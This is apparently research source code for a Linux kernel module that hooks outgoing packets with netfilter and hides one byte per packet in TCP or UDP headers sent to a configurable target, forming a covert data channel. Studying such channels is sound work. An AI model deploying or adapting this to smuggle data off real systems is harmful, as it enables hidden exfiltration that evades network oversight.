#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/version.h>

#include "packet_parser.h"
#include "tcp_embed.h"
#include "udp_embed.h"
#include "framing.h"
#include "error_handler.h"

#define COVERT_VERSION "1.0.0"
#define COVERT_DEFAULT_PORT  9999
#define COVERT_DEFAULT_IP    "10.0.2.15"
#define COVERT_LOG_RATE_LIMIT 10  /* Max log messages per second */

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Covert Channel Research");
MODULE_DESCRIPTION("Covert data channel via TCP/UDP header embedding");
MODULE_VERSION(COVERT_VERSION);

/* Module parameters */
static int target_port = COVERT_DEFAULT_PORT;
module_param(target_port, int, 0644);
MODULE_PARM_DESC(target_port, "Target port for covert channel (default 9999)");

static char *target_ip = COVERT_DEFAULT_IP;
module_param(target_ip, charp, 0644);
MODULE_PARM_DESC(target_ip, "Target IP address (default 10.0.2.15)");

/* Netfilter hook structures */
static struct nf_hook_ops nf_hook_out;
static struct nf_hook_ops nf_hook_in;

/* Rate limiting for logs */
static unsigned long last_log_jiffies;
static int log_count;

/* Convert dotted IP string to __be32 */
static __be32 parse_target_ip(void)
{
	__be32 ip;
	if (!target_ip || *target_ip == '\0')
		return 0; /* 0 = match any IP */

	if (in4_pton(target_ip, -1, (u8 *)&ip, -1, NULL) != 1) {
		pr_warn("covert: invalid target_ip '%s', using 0.0.0.0\n", target_ip);
		return 0;
	}
	return ip;
}

/*
 * Rate-limited pr_info — prevents log spam from flooding dmesg.
 */
static void covert_log(const char *fmt, ...)
{
	va_list args;
	unsigned long now = jiffies;

	if (now - last_log_jiffies > HZ) {
		last_log_jiffies = now;
		log_count = 0;
	}

	if (log_count < COVERT_LOG_RATE_LIMIT) {
		va_start(args, fmt);
		vprintk(fmt, args);
		va_end(args);
		log_count++;
	}
}

/*
 * Hook callback for outgoing packets (LOCAL_OUT / POST_ROUTING).
 * Intercepts target packets and embeds one byte per packet.
 */
static unsigned int covert_hook_out(void *priv,
				    struct sk_buff *skb,
				    const struct nf_hook_state *state)
{
	struct covert_packet_info info;
	__be32 dst_ip;
	__be16 dst_port;
	u8 byte;

	/* Parse packet headers */
	if (covert_parse_packet(skb, &info) < 0)
		return NF_ACCEPT;

	/* Check if target packet */
	dst_ip   = parse_target_ip();
	dst_port = htons((__be16)target_port);

	if (!covert_is_target_packet(&info, dst_ip, dst_port))
		return NF_ACCEPT;

	/* Log at rate limit */
	covert_log("covert: target packet detected [%pI4:%d -> %pI4:%d]\n",
		   &info.src_ip, ntohs(info.src_port),
		   &info.dst_ip, ntohs(info.dst_port));

	/* Get next byte from framing protocol */
	if (covert_framing_get_next(&byte) < 0)
		return NF_ACCEPT; /* No pending data, let packet pass */

	/* Embed byte into appropriate protocol */
	if (info.protocol == IPPROTO_TCP) {
		if (covert_tcp_embed_byte(skb, byte) < 0)
			return NF_ACCEPT;
		covert_log("covert: TCP embedded byte 0x%02x\n", byte);

	} else if (info.protocol == IPPROTO_UDP) {
		if (covert_udp_embed_byte(skb, byte) < 0)
			return NF_ACCEPT;
		covert_log("covert: UDP embedded byte 0x%02x\n", byte);
	}

	return NF_ACCEPT;
}

/*
 * Hook callback for incoming packets (LOCAL_IN).
 * Passes through — receiver uses user-space Scapy, not kernel.
 */
static unsigned int covert_hook_in(void *priv,
				   struct sk_buff *skb,
				   const struct nf_hook_state *state)
{
	return NF_ACCEPT;
}

/*
 * Module initialization.
 */
static int __init covert_init(void)
{
	int ret;

	pr_info("covert: loading module v%s\n", COVERT_VERSION);
	pr_info("covert: target = %s:%d\n",
		target_ip ? target_ip : "any", target_port);

	/* Register outgoing hook */
	nf_hook_out.hook     = covert_hook_out;
	nf_hook_out.hooknum  = NF_INET_LOCAL_OUT;
	nf_hook_out.pf       = PF_INET;
	nf_hook_out.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	ret = nf_register_net_hook(&init_net, &nf_hook_out);
#else
	ret = nf_register_hook(&nf_hook_out);
#endif
	if (ret) {
		pr_err("covert: failed to register outgoing hook: %d\n", ret);
		return ret;
	}

	/* Register incoming hook (pass-through) */
	nf_hook_in.hook     = covert_hook_in;
	nf_hook_in.hooknum  = NF_INET_LOCAL_IN;
	nf_hook_in.pf       = PF_INET;
	nf_hook_in.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	ret = nf_register_net_hook(&init_net, &nf_hook_in);
#else
	ret = nf_register_hook(&nf_hook_in);
#endif
	if (ret) {
		pr_err("covert: failed to register incoming hook: %d\n", ret);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
		nf_unregister_net_hook(&init_net, &nf_hook_out);
#else
		nf_unregister_hook(&nf_hook_out);
#endif
		return ret;
	}

	pr_info("covert: module loaded successfully, hooks active\n");
	return 0;
}

/*
 * Module cleanup — unregister hooks, free resources.
 */
static void __exit covert_exit(void)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_unregister_net_hook(&init_net, &nf_hook_out);
	nf_unregister_net_hook(&init_net, &nf_hook_in);
#else
	nf_unregister_hook(&nf_hook_out);
	nf_unregister_hook(&nf_hook_in);
#endif

	pr_info("covert: module unloaded, hooks removed\n");
}

module_init(covert_init);
module_exit(covert_exit);
